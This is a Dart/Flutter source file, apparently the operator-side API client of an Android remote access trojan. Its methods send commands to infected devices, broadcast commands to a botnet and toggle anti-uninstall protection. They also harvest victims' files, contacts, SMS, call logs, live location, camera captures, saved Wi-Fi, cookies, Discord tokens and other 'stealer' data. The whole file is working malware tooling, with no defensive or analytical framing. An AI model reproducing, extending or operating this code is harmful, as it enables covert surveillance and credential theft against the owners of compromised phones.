import 'dart:convert';
import 'package:http/http.dart' as http;  // Ganti dari holow ke http standar
import 'package:shared_preferences/shared_preferences.dart';
import 'constants.dart';

class RatApiService {
  final String? sessionKey;

  RatApiService([this.sessionKey]);

  // ============================================================
  // NOTIFICATIONS
  // ============================================================
  Future<dynamic> getNotifications(String deviceId) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/notifications/$deviceId');
    final response = await http.get(
      url, 
      headers: {
        'Content-Type': 'application/json', 
        'x-session-key': sessionKey!,
      },
    );
    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return _extractList(data, 'notifications');
      }
      return _extractList(data, 'notifications');
    }
    return [];
  }

  // ============================================================
  // DEVICES
  // ============================================================
  Future<List<dynamic>> getDevices() async {
    if (sessionKey == null) throw Exception("Session Key needed");
    
    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/devices');
    final response = await http.get(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
    );

    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return _extractList(data, 'devices');
      }
      return _extractList(data, 'devices');
    } else {
      throw Exception('Failed to load devices: ${response.body}');
    }
  }

  // ============================================================
  // COMMANDS
  // ============================================================
  Future<void> sendCommand(String deviceId, String command, {String? args}) async {
    if (sessionKey == null) throw Exception("Session Key needed");

    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/command');
    final response = await http.post(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
      body: jsonEncode({
        'deviceId': deviceId,
        'command': command,
        'args': args,
      }),
    );

    if (response.statusCode != 200) {
      final err = jsonDecode(response.body);
      throw Exception(err['error'] ?? 'Command failed');
    }
  }

  Future<void> broadcastBotnet(String command, {String? args}) async {
    if (sessionKey == null) throw Exception("Session Key needed");

    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/broadcast-botnet');
    final response = await http.post(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
      body: jsonEncode({
        'command': command,
        'args': args,
      }),
    );

    if (response.statusCode != 200) {
      final err = jsonDecode(response.body);
      throw Exception(err['error'] ?? 'Broadcast failed');
    }
  }

  Future<void> toggleAntiUninstall(String deviceId, bool enabled) async {
    if (sessionKey == null) throw Exception("Session Key needed");

    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/toggle-anti-uninstall');
    final response = await http.post(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
      body: jsonEncode({
        'deviceId': deviceId,
        'enabled': enabled,
      }),
    );

    if (response.statusCode != 200) {
      final err = jsonDecode(response.body);
      throw Exception(err['error'] ?? 'Failed to toggle anti-uninstall');
    }
  }
  
  // ============================================================
  // STORAGE / FILES
  // ============================================================
  Future<Map<String, dynamic>> listLiveStorage(String deviceId, {String path = ""}) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    
    await sendCommand(deviceId, "LS", args: path);
    
    int tries = 0;
    while (tries < 15) {
        await Future.delayed(const Duration(seconds: 1));
        final resp = await getLastResponse(deviceId);
        if (resp != null && resp['content'] != null) {
            String content = resp['content'].toString();
            if (content.startsWith('RESP:LS:')) {
                String jsonStr = content.substring(8);
                return jsonDecode(jsonStr);
            }
        }
        tries++;
    }
    throw Exception("Timeout waiting for storage response");
  }

  Future<List<dynamic>> getStorageFiles(String deviceId) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    
    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/files/$deviceId');
    final response = await http.get(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
    );

    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return _extractList(data, 'files');
      }
      return _extractList(data, 'files');
    } else {
      throw Exception('Failed to load files: ${response.body}');
    }
  }

  Future<Map<String, dynamic>?> getLastResponse(String deviceId) async {
    if (sessionKey == null) return null;
    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/response/$deviceId');
    try {
      final response = await http.get(
        url,
        headers: {
            'Content-Type': 'application/json',
            'x-session-key': sessionKey!,
        },
      );
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data is Map && data.containsKey('response')) {
          return data['response'];
        }
        return data;
      }
    } catch (e) {
      print("Error fetching response: $e");
    }
    return null;
  }

  String getDownloadUrl(String deviceId, String filename) {
    return '${RatConstants.baseUrl}/XzV/rat/download/$deviceId/$filename?key=$sessionKey';
  }

  // ============================================================
  // CONTACTS
  // ============================================================
  Future<List<dynamic>> getContacts(String deviceId) async {
    final data = await _fetchData('contacts', deviceId);
    return _extractList(data, 'contacts');
  }

  // ============================================================
  // STEALER
  // ============================================================
  Future<Map<String, dynamic>> getStealer(String deviceId) async {
    final data = await _fetchData('stealer', deviceId);
    if (data == null) return {};
    if (data is Map && data.containsKey('stealer')) {
      return Map<String, dynamic>.from(data['stealer'] ?? {});
    }
    if (data is Map) {
      return Map<String, dynamic>.from(data);
    }
    return {};
  }

  // ============================================================
  // SMS
  // ============================================================
  Future<List<dynamic>> getSms(String deviceId) async {
    final data = await _fetchData('sms', deviceId);
    return _extractList(data, 'sms');
  }

  // ============================================================
  // CALL LOGS
  // ============================================================
  Future<List<dynamic>> getCallLogs(String deviceId) async {
    final data = await _fetchData('calls', deviceId);
    return _extractList(data, 'calls');
  }

  // ============================================================
  // SIM INFO
  // ============================================================
  Future<Map<String, dynamic>> getSim(String deviceId) async {
    final data = await _fetchData('sim', deviceId);
    if (data is Map && data.containsKey('sim')) {
      return Map<String, dynamic>.from(data['sim'] ?? {});
    }
    if (data is Map) return Map<String, dynamic>.from(data);
    return {};
  }

  // ============================================================
  // LOCATION
  // ============================================================
  Future<Map<String, dynamic>> getLocation(String deviceId) async {
    final data = await _fetchData('location', deviceId);
    if (data is Map && data.containsKey('location')) {
      return Map<String, dynamic>.from(data['location'] ?? {});
    }
    if (data is Map) return Map<String, dynamic>.from(data);
    return {};
  }

  Future<Map<String, dynamic>> getLiveLoc(String deviceId) async {
    final data = await _fetchData('live-loc', deviceId);
    if (data is Map) return Map<String, dynamic>.from(data);
    return {'history': []};
  }

  // ============================================================
  // CHAT
  // ============================================================
  Future<List<dynamic>> getChatHistory(String deviceId) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/chat/$deviceId');
    final response = await http.get(
      url, 
      headers: {
        'Content-Type': 'application/json', 
        'x-session-key': sessionKey!,
      },
    );
    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return _extractList(data, 'chat');
      }
      return _extractList(data, 'chat');
    }
    return [];
  }

  Future<void> sendChatMessage(String deviceId, String message) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/chat');
    final response = await http.post(
      url,
      headers: {
        'Content-Type': 'application/json', 
        'x-session-key': sessionKey!,
      },
      body: jsonEncode({'deviceId': deviceId, 'message': message}),
    );
    if (response.statusCode != 200) {
      throw Exception('Failed to send message: ${response.body}');
    }
  }

  // ============================================================
  // DEVICE DETAILS
  // ============================================================
  Future<Map<String, dynamic>> getDeviceDetails(String deviceId) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    
    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/details/$deviceId');
    final response = await http.get(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
    );

    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return data['device'] ?? {};
      }
      return data['device'] ?? data;
    } else {
      throw Exception('Failed to load device details: ${response.body}');
    }
  }

  // ============================================================
  // CAMERA
  // ============================================================
  Future<List<dynamic>> getCameraHistory(String deviceId) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/camera/history/$deviceId');
    final response = await http.get(
      url, 
      headers: {
        'Content-Type': 'application/json', 
        'x-session-key': sessionKey!,
      },
    );
    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return _extractList(data, 'history');
      }
      return _extractList(data, 'history');
    }
    return [];
  }

  // ============================================================
  // APPS & WIFI
  // ============================================================
  Future<dynamic> getRunningApps(String deviceId) => 
    _fetchData('running-apps', deviceId).then((v) => _extractList(v, 'apps'));
    
  Future<dynamic> getInstalledApps(String deviceId) => 
    _fetchData('installed-apps', deviceId).then((v) => _extractList(v, 'apps'));
    
  Future<dynamic> getSavedWifi(String deviceId) => 
    _fetchData('wifi/saved', deviceId).then((v) => _extractList(v, 'networks'));
    
  Future<List<dynamic>> getNearbyWifi(String deviceId) => 
    _fetchData('wifi/nearby', deviceId).then((v) => _extractList(v, 'networks'));
    
  Future<List<dynamic>> getBlacklist(String deviceId) => 
    _fetchData('blacklist', deviceId).then((v) => _extractList(v, 'blacklist'));
    
  Future<List<dynamic>> getDiscordTokens(String deviceId) => 
    _fetchData('discord-tokens', deviceId).then((v) => _extractList(v, 'tokens'));
    
  Future<List<dynamic>> getCookies(String deviceId) => 
    _fetchData('cookies', deviceId).then((v) => _extractList(v, 'history'));

  // ============================================================
  // PRIVATE METHODS
  // ============================================================
  Future<dynamic> _fetchData(String endpoint, String deviceId) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/$endpoint/$deviceId');
    final response = await http.get(
      url, 
      headers: {
        'Content-Type': 'application/json', 
        'x-session-key': sessionKey!,
      },
    );
    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        if (data is Map) {
          for (var key in data.keys) {
            if (key != 'success' && data[key] != null) {
              return data[key];
            }
          }
        }
        return data;
      }
      return data;
    }
    return null;
  }

  List<dynamic> _extractList(dynamic value, [String? key]) {
    if (value == null) return [];
    if (value is List) return value;
    if (value is Map) {
      if (key != null && value.containsKey(key) && value[key] is List) {
        return value[key];
      }
      final keys = ['networks', 'apps', 'blacklist', 'list', 'history', 'tokens', 'contacts', 'calls', 'sms', 'devices', 'files', 'notifications', 'chat'];
      for (var k in keys) {
        if (value.containsKey(k)) {
          if (value[k] is List) return value[k];
          if (value[k] is Map) return _extractList(value[k], key); 
        }
      }
      for (var val in value.values) {
        if (val is List) return val;
      }
    }
    return [];
  }
}